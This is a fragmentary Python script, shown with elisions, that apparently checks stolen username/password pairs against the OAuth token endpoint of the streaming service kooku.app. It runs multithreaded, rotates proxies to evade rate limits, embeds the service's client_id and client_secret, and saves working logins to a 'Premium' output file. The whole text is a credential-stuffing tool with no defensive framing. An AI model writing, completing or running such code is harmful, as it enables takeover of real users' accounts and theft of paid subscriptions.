...
output_file_paid = "ULLAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
...
loginURL="https://kooku.app/rst/oauth/token"
    ...
    def run(self):
        while not q.empty():
            ...
            try:
                ...
                r.proxies = proxy
                myusr = "grant_type=password&scope=read%20write&username="+un+"&password="+pas+"&client_id=consumerWeb&client_secret=consumerWeb%40123"
                ...
                if(r1.status_code==200):
                    ...
                    statusUpdate(cred,json.loads(r1.text)["error_description"],container,2)
